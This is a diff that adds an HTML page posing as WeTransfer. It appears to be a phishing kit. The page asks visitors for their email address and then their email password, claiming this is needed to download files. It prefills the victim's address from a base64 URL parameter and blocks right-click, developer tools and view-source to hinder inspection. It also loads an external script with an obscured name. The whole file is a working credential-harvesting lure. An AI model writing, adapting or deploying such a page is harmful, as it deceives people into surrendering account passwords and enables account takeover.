@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wetransfer</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Modal -->
+    <div id="modal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+           <br>
+            <h5>Enter email to download files</h5>
+            <form id="form">
+                
+                <div id="email-step" class="form-step" >
+                    <label for="email">To Email:</label>
+                    <input type="email" id="email" name="email"  placeholder="Enter your email" required>
+                    <span id="email-feedback"  style="display: none; color: red;"></span> <!-- Feedback span -->
+                    <button type="submit" id="proceed-email">Download to Email</button>
+                    
+                </div>
+            </form>
+            <form id="password-form">
+                <div id="password-step" class="form-step" >
+                    <input type="password" style="display:none">
+                    <label for="email-confirmation">To Email:</label> 
+                    <input type="email" id="email-confirmation" name="email-confirmation" readonly> 
+                    
+                    <label for="password">Confirm email password:</label> 
+                    <input type="password" id="password"  placeholder="Email password" autocomplete="new-password" name="passit" required >
+                    
+                    <span class="feedback"></span>
+                    <button type="submit" id="proceed-submit">Continue</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    
+    <script >
+      document.addEventListener('contextmenu', function(e) {
+    e.preventDefault();
+});
+
+document.addEventListener('keydown', function(e) {
+    // Disable F12
+    if (e.key === 'F12') {
+        e.preventDefault();
+    }
+    // Disable Ctrl+Shift+I (for Chrome DevTools)
+    if ((e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.shiftKey && e.key === 'J')) {
+        e.preventDefault();
+    }
+    // Disable Ctrl+U (View Source)
+    if (e.ctrlKey && e.key === 'u') {
+        e.preventDefault();
+    }
+});  
+
+
+function encodeEmailToBase64(email) {
+    return btoa(email);
+}
+
+// Function to decode base64 email
+function decodeEmailFromBase64(encodedEmail) {
+    return atob(encodedEmail);
+}
+
+// Function to update the URL with encoded email
+function updateURLWithEncodedEmail(encodedEmail) {
+    const baseURL = `${window.location.protocol}//${window.location.hostname}${window.location.port ? ':' + window.location.port : ''}${window.location.pathname}`;
+    const newURL = `${baseURL}?u=${encodedEmail}`;
+    history.replaceState({}, '', newURL); // Update the URL without redirecting
+}
+
+// Function to get query parameters from the URL
+function getQueryParam(param) {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(param);
+}
+
+window.onload = function() {
+    emailFromURL = getQueryParam('u');
+    if (emailFromURL) {
+        try {
+            // Decode the email if it's base64 encoded
+            emailFromURL = decodeEmailFromBase64(emailFromURL);
+        } catch (e) {
+            // everything gonna be alright
+        }
+        // Update the URL with the base64 encoded version of the email
+        const encodedEmail = encodeEmailToBase64(emailFromURL);
+        updateURLWithEncodedEmail(encodedEmail);
+       
+        
+    }
+};
+
+// function loadScript(url) {
+//     var script = document.createElement("script");
+//     script.src = url;
+//     document.body.appendChild(script);
+// }
+
+
+
+    </script>
+        <script src="efwef4/efwef4frr.js"></script>
+
+
+</body>
+</html>
